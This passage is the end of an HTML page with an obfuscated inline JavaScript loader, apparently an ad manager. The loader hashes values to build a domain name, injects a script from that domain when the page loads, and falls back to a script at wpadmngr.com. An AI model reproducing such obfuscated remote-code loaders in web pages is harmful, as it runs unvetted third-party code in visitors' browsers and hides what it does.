x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>